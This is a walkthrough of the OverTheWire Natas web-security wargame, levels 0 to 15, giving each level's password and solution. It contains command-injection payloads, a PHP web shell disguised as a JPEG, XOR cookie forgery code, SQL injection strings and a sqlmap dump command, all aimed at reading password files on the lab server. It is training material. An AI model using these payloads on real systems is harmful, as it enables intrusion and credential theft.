# Natas
###### tags: `security walkthrough`
## Level 0
```
Username: natas0
Password: natas0
```
* http://natas0.natas.labs.overthewire.org

![](https://i.imgur.com/hh8ZogL.png)
* password
```
gtVrDuiDfck831PqWsLEZy5gyDz1clto
```
## Level 0 - 1
* http://natas1.natas.labs.overthewire.org

![](https://i.imgur.com/scBGOqP.png)
* password
```
ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
```
## Level 1 - 2
* http://natas2.natas.labs.overthewire.org
```
<img src="files/pixel.png">
```

![](https://i.imgur.com/T6HDBMb.png)

```
http://natas2.natas.labs.overthewire.org/files
```

![](https://i.imgur.com/sioADqa.png)

```
http://natas2.natas.labs.overthewire.org/files/users.txt
```

![](https://i.imgur.com/vh0t5vB.png)
* password
```
sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
```
## Level 2 - 3
* http://natas3.natas.labs.overthewire.org

![](https://i.imgur.com/UnvOwWY.png)

```
https://natas3.natas.labs.overthewire.org/robots.txt
```

![](https://i.imgur.com/akd0EF6.png)

```
https://natas3.natas.labs.overthewire.org/s3cr3t/
```

![](https://i.imgur.com/JR9UAiV.png)
```
http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```

![](https://i.imgur.com/vr8wjvG.png)

* password
```
Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```
## Level 3 - 4
* http://natas4.natas.labs.overthewire.org

![](https://i.imgur.com/4VeYxue.png)

![](https://i.imgur.com/GTaQvnd.png)

* password
```
iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```
## Level 4 - 5
* http://natas5.natas.labs.overthewire.org

![](https://i.imgur.com/0ou8ZLQ.png)

![](https://i.imgur.com/rVP27Og.png)

* password
```
aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```
## Level 5 - 6
* http://natas6.natas.labs.overthewire.org

![](https://i.imgur.com/FsXGMRT.png)

![](https://i.imgur.com/11oYqbU.png)

![](https://i.imgur.com/GbsqPUk.png)

* secret
```
FOEIUWGHFEEUHOFUOIU
```

![](https://i.imgur.com/EWQppJ7.png)

* password
```
7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```
## Level 6 - 7
* http://natas7.natas.labs.overthewire.org

```
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

![](https://i.imgur.com/dnPKvwY.png)

```
index.php?page=/etc/natas_webpass/natas8
```

![](https://i.imgur.com/7BavDqS.png)

* password
```
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```
## Level 7 - 8
* http://natas8.natas.labs.overthewire.org
* view source code.

![](https://i.imgur.com/TDcKsZp.png)

* reverse encode to get password.
```
<?php
$secret = "3d3d516343746d4d6d6c315669563362";
$txt = base64_decode(strrev(hex2bin($secret)));
echo "$txt";
?>
```
```
oubWYf2kBq
```
![](https://i.imgur.com/UDCWpQq.png)

![](https://i.imgur.com/w8yMWXF.png)

* password
```
W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```
## Level 8 - 9
* http://natas9.natas.labs.overthewire.org

* view source code.

![](https://i.imgur.com/LpSbMoa.png)

* inject shell command.
```
; cat /etc/natas_webpass/natas10 #
```

![](https://i.imgur.com/LydNdsw.png)

* password
```
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```
## Level 9 - 10
* http://natas10.natas.labs.overthewire.org
* view source code

![](https://i.imgur.com/mjQSO5O.png)
* origin
```
passthru("grep -i $key dictionary.txt");
```
* input
```
'' /etc/natas_webpass/natas11
```
* inject result
```
passthru("grep -i '' /etc/natas_webpass/natas11 dictionary.txt");
```

![](https://i.imgur.com/S3H3Z1h.png)
* password
```
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```
## Level 10 - 11
* http://natas11.natas.labs.overthewire.org
* view source code

![](https://i.imgur.com/3HFGIyZ.png)

* xor encrypt
```
cipher_txt = plain_txt ^ key
plain_txt = cipher_txt ^ key
key = plain_txt ^ cipher_txt
```
* prepare plain and cipher txt
```
// base64 decode cookie as cipher txt
base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D"); 

// json encode default data as plain txt
json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff");)
```
* get key
```
<?php
function xor_encrypt() {
    $key = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D");
    $text = json_encode(array( "showpassword"=>"no","bgcolor"=>"#ffffff"));
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo xor_encrypt();
?>
```
```
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
```
* get new cookie
```
<?php
function xor_encrypt() {
    $key = "qw8J";
    $text = json_encode(array("showpassword"=>"yes","bgcolor"=>"#ffffff"));
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo base64_encode(xor_encrypt());
?>
```
```
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```
* set new cookie and refresh page

![](https://i.imgur.com/R7ymqSF.png)
* password
```
EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```
## Level 11 - 12
* http://natas12.natas.labs.overthewire.org
* prepare exploit image
```
echo "<?php echo system(\"cat /etc/natas_webpass/natas13\"); ?>" > natas12.jpg
```

* upload file and change ext name jpt to php

![](https://i.imgur.com/OqdWFoJ.png)

* click url

![](https://i.imgur.com/VmJyGZr.png)

* get password

![](https://i.imgur.com/apCQAyv.png)

* password
```
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```
## Level 12 - 13
* http://natas13.natas.labs.overthewire.org
* prepare exploit image
```
echo "<?php echo system(\"cat /etc/natas_webpass/natas14\"); ?>" > natas13.jpg
```
* make jpg file hex signature `FF D8 FF DB` 
```
hexeditor -b natas13.jpg  
```
* ctrl+A add four bytes and mdf to `FF D8 FF DB`

![](https://i.imgur.com/KKVyIp2.png)

* upload file and change ext name jpt to php

![](https://i.imgur.com/eAyJvBy.png)

* click url

![](https://i.imgur.com/4w6mZHX.png)

* get password

![](https://i.imgur.com/bubIMdy.png)

* password
```
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```
## Level 13 - 14
* http://natas14.natas.labs.overthewire.org
* use sql injection
```
natas15" #
```
![](https://i.imgur.com/wcBQUpb.png)
* password
```
AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```
## Level 14 - 15
* http://natas15.natas.labs.overthewire.org
* use bind sql injection by like query to combine the password
```
natas16" AND password LIKE BINARY "<CHAR>%" "
```
* use sqlmap tool
```
sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php" --auth-type=basic --auth-cred=natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data="username=natas16" --string="This user exists" --level=5 --risk=3 -D natas15 -T users -C username,password --dump --threads=5
```
![](https://i.imgur.com/qYhAiA0.png)
* password
```
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```
